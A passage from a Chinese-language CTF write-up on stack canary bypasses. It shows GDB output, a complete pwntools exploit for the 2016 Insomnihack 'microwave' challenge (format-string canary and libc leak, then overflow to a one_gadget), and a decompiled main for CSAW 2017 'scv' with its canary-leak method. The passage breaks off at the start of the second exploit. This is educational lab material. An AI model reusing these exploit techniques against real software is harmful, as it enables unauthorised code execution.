rax,0x0)</span><br><span class="line">RIP: 0x7ffff7b04260 (&lt;__read_nocancel+7&gt;:	cmp    rax,0xfffffffffffff001)</span><br><span class="line">R8 : 0x7ffff7dd3780 --&gt; 0x0</span><br><span class="line">R9 : 0x7ffff7fd8700 (0x00007ffff7fd8700)</span><br><span class="line">R10: 0x7ffff7fd8700 (0x00007ffff7fd8700)</span><br><span class="line">R11: 0x246</span><br><span class="line">R12: 0xa (&apos;\n&apos;)</span><br><span class="line">R13: 0x2</span><br><span class="line">R14: 0x55555575906d (&quot;p.%p.%p.%p\n&quot;)</span><br><span class="line">R15: 0x7ffff7dd18e0 --&gt; 0xfbad2288</span><br><span class="line">EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x7ffff7b04257 &lt;read+7&gt;:	jne    0x7ffff7b04269 &lt;read+25&gt;</span><br><span class="line">   0x7ffff7b04259 &lt;__read_nocancel&gt;:	mov    eax,0x0</span><br><span class="line">   0x7ffff7b0425e &lt;__read_nocancel+5&gt;:	syscall</span><br><span class="line">=&gt; 0x7ffff7b04260 &lt;__read_nocancel+7&gt;:	cmp    rax,0xfffffffffffff001</span><br><span class="line">   0x7ffff7b04266 &lt;__read_nocancel+13&gt;:	jae    0x7ffff7b04299 &lt;read+73&gt;</span><br><span class="line">   0x7ffff7b04268 &lt;__read_nocancel+15&gt;:	ret</span><br><span class="line">   0x7ffff7b04269 &lt;read+25&gt;:	sub    rsp,0x8</span><br><span class="line">   0x7ffff7b0426d &lt;read+29&gt;:	call   0x7ffff7b220d0 &lt;__libc_enable_asynccancel&gt;</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7fffffffda28 --&gt; 0x7ffff7a875e8 (&lt;_IO_new_file_underflow+328&gt;:	cmp    rax,0x0)</span><br><span class="line">0008| 0x7fffffffda30 --&gt; 0x7ffff7dd26a3 --&gt; 0xdd3780000000000a</span><br><span class="line">0016| 0x7fffffffda38 --&gt; 0x7ffff7dd18e0 --&gt; 0xfbad2288</span><br><span class="line">0024| 0x7fffffffda40 --&gt; 0x7fffffffdae0 --&gt; 0x7fffff000a31</span><br><span class="line">0032| 0x7fffffffda48 --&gt; 0x7ffff7a8860e (&lt;__GI__IO_default_uflow+14&gt;:	cmp    eax,0xffffffff)</span><br><span class="line">0040| 0x7fffffffda50 --&gt; 0x0</span><br><span class="line">0048| 0x7fffffffda58 --&gt; 0x7ffff7a7bc6a (&lt;__GI__IO_getline_info+170&gt;:	cmp    eax,0xffffffff)</span><br><span class="line">0056| 0x7fffffffda60 --&gt; 0x19</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGINT</span><br><span class="line">0x00007ffff7b04260 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:84</span><br><span class="line">84	../sysdeps/unix/syscall-template.S: No such file or directory.</span><br><span class="line">assassinq&gt;&gt; vmmap</span><br><span class="line">Start              End                Perm	Name</span><br><span class="line">0x0000555555554000 0x0000555555557000 r-xp	/home/assassinq/pwn/ctf-wiki/canary/2016-insomnihack-microwave/microwave</span><br><span class="line">0x0000555555757000 0x0000555555758000 r--p	/home/assassinq/pwn/ctf-wiki/canary/2016-insomnihack-microwave/microwave</span><br><span class="line">0x0000555555758000 0x0000555555759000 rw-p	/home/assassinq/pwn/ctf-wiki/canary/2016-insomnihack-microwave/microwave</span><br><span class="line">0x0000555555759000 0x000055555577a000 rw-p	[heap]</span><br><span class="line">0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp	/lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7bcd000 0x00007ffff7dcd000 ---p	/lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dcd000 0x00007ffff7dd1000 r--p	/lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p	/lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p	mapped</span><br><span class="line">0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp	/lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7fd7000 0x00007ffff7fda000 rw-p	mapped</span><br><span class="line">0x00007ffff7ff7000 0x00007ffff7ffa000 r--p	[vvar]</span><br><span class="line">0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp	[vdso]</span><br><span class="line">0x00007ffff7ffc000 0x00007ffff7ffd000 r--p	/lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p	/lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffe000 0x00007ffff7fff000 rw-p	mapped</span><br><span class="line">0x00007ffffffdd000 0x00007ffffffff000 rw-p	[stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]</span><br></pre></td></tr></table></figure>
<p>最后放上 exp：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line"># context.log_level = &apos;debug&apos;</span><br><span class="line">context.arch = &apos;amd64&apos;</span><br><span class="line">local = 0</span><br><span class="line">if local:</span><br><span class="line">	p = process(&apos;./microwave&apos;)</span><br><span class="line">	libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">	libc_base_offset = 0xf72c0</span><br><span class="line">	one_gadget_offset = 0x45216</span><br><span class="line">else:</span><br><span class="line">	p = remote(&apos;127.0.0.1&apos;, 1337)</span><br><span class="line">	libc = ELF(&apos;./libc.so.6&apos;)</span><br><span class="line">	libc_base_offset = 0xeb870</span><br><span class="line">	one_gadget_offset = 0x464d8</span><br><span class="line">elf = ELF(&apos;./microwave&apos;)</span><br><span class="line">log.success(&apos;libc_base_offset = &apos; + hex(libc_base_offset))</span><br><span class="line">log.success(&apos;one_gadget_offset = &apos; + hex(one_gadget_offset))</span><br><span class="line"></span><br><span class="line">def connect(username, password):</span><br><span class="line">	p.sendlineafter(&apos;[MicroWave]:&apos;, &apos;1&apos;)</span><br><span class="line">	p.sendlineafter(&apos;username:&apos;, username)</span><br><span class="line">	p.sendlineafter(&apos;password:&apos;, password)</span><br><span class="line"></span><br><span class="line">def edit(content):</span><br><span class="line">	p.sendlineafter(&apos;[MicroWave]:&apos;, &apos;2&apos;)</span><br><span class="line">	p.sendlineafter(&apos;#&gt;&apos;, content)</span><br><span class="line"></span><br><span class="line">def tweet():</span><br><span class="line">	p.sendlineafter(&apos;[MicroWave]:&apos;, &apos;3&apos;)</span><br><span class="line"></span><br><span class="line">def quit():</span><br><span class="line">	p.sendlineafter(&apos;[MicroWave]:&apos;, &apos;q&apos;)</span><br><span class="line"></span><br><span class="line"># gdb.attach(p)</span><br><span class="line">password = &apos;n07_7h3_fl46&apos;</span><br><span class="line">connect(&apos;%p.&apos; * 8, password)</span><br><span class="line">p.recvuntil(&apos;Checking&apos;)</span><br><span class="line">leak_data = p.recvline().strip().split(&apos;.&apos;)[:-1]</span><br><span class="line">print leak_data</span><br><span class="line">canary = int(leak_data[5][2:], 16)</span><br><span class="line">log.success(&apos;canary = &apos; + hex(canary))</span><br><span class="line">leak_libc = int(leak_data[1][2:], 16)</span><br><span class="line">log.success(&apos;leak_libc = &apos; + hex(leak_libc))</span><br><span class="line">libc_base = leak_libc - libc_base_offset</span><br><span class="line">log.success(&apos;libc_base = &apos; + hex(libc_base))</span><br><span class="line">one_gadget = libc_base + one_gadget_offset</span><br><span class="line">log.success(&apos;one_gadget = &apos; + hex(one_gadget))</span><br><span class="line">payload = flat([</span><br><span class="line">	&apos;A&apos; * 1032,</span><br><span class="line">	canary,</span><br><span class="line">	&apos;B&apos; * 8,</span><br><span class="line">	one_gadget</span><br><span class="line">])</span><br><span class="line">edit(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="2017-CSAW-Quals-scv"><a href="#2017-CSAW-Quals-scv" class="headerlink" title="2017-CSAW-Quals-scv"></a>2017-CSAW-Quals-scv</h3><p>开了<code>Canary</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/assassinq/pwn/ctf-wiki/canary/2017-CSAW-Quals-csv/scv&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>就只有一个 main 函数，由于是 c++程序，看起来有点混乱：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  __int64 v7; <span class="comment">// rax</span></span><br><span class="line">  __int64 v8; <span class="comment">// rax</span></span><br><span class="line">  __int64 v9; <span class="comment">// rax</span></span><br><span class="line">  __int64 v10; <span class="comment">// rax</span></span><br><span class="line">  __int64 v11; <span class="comment">// rax</span></span><br><span class="line">  __int64 v12; <span class="comment">// rax</span></span><br><span class="line">  __int64 v13; <span class="comment">// rax</span></span><br><span class="line">  __int64 v14; <span class="comment">// rax</span></span><br><span class="line">  __int64 v15; <span class="comment">// rax</span></span><br><span class="line">  __int64 v16; <span class="comment">// rax</span></span><br><span class="line">  __int64 v17; <span class="comment">// rax</span></span><br><span class="line">  __int64 v18; <span class="comment">// rax</span></span><br><span class="line">  __int64 v19; <span class="comment">// rax</span></span><br><span class="line">  __int64 v20; <span class="comment">// rax</span></span><br><span class="line">  __int64 v21; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> choice; <span class="comment">// [rsp+4h] [rbp-BCh]</span></span><br><span class="line">  <span class="keyword">int</span> v24; <span class="comment">// [rsp+8h] [rbp-B8h]</span></span><br><span class="line">  <span class="keyword">int</span> v25; <span class="comment">// [rsp+Ch] [rbp-B4h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-B0h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v27; <span class="comment">// [rsp+B8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v27 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  choice = <span class="number">0</span>;</span><br><span class="line">  v24 = <span class="number">1</span>;</span><br><span class="line">  v25 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v24 )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"-------------------------"</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    v4 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"[*]SCV GOOD TO GO,SIR...."</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    v5 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"-------------------------"</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v5, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    v6 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"1.FEED SCV...."</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v6, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    v7 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"2.REVIEW THE FOOD...."</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v7, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    v8 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"3.MINE MINERALS...."</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v8, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    v9 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"-------------------------"</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v9, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"&gt;&gt;"</span>);</span><br><span class="line">    <span class="built_in">std</span>::istream::<span class="keyword">operator</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;choice);</span><br><span class="line">    <span class="keyword">switch</span> ( choice )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:                                   <span class="comment">// show</span></span><br><span class="line">        v15 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"-------------------------"</span>);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v15, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        v16 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"[*]REVIEW THE FOOD..........."</span>);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v16, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        v17 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"-------------------------"</span>);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v17, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        v18 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"[*]PLEASE TREAT HIM WELL....."</span>);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v18, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        v19 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"-------------------------"</span>);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v19, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        <span class="built_in">puts</span>(&amp;buf);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:                                   <span class="comment">// exit</span></span><br><span class="line">        v24 = <span class="number">0</span>;</span><br><span class="line">        v20 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"[*]BYE ~ TIME TO MINE MIENRALS..."</span>);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v20, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:                                   <span class="comment">// edit</span></span><br><span class="line">        v10 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"-------------------------"</span>);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v10, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        v11 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"[*]SCV IS ALWAYS HUNGRY....."</span>);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v11, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        v12 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"-------------------------"</span>);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v12, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        v13 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"[*]GIVE HIM SOME FOOD......."</span>);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v13, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        v14 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"-------------------------"</span>);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v14, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"&gt;&gt;"</span>);</span><br><span class="line">        v25 = read(<span class="number">0</span>, &amp;buf, <span class="number">0xF8</span>uLL);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        v21 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"[*]DO NOT HURT MY SCV...."</span>);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v21, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>case 1</code>存在<code>buffer overflow</code>，通过调试观察到输入与<code>Canary</code>之间的偏移为 168。如果要泄漏<code>Canary</code>的话，就必须让所有的<code>\x00</code>被覆盖掉，包括<code>Canary</code>低位的<code>\x00</code>，以让<code>puts</code>认为 buf 连同<code>Canary</code>为一个字符串。libc 也可以用同样的方式泄漏，最后放上 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	p = process(<span 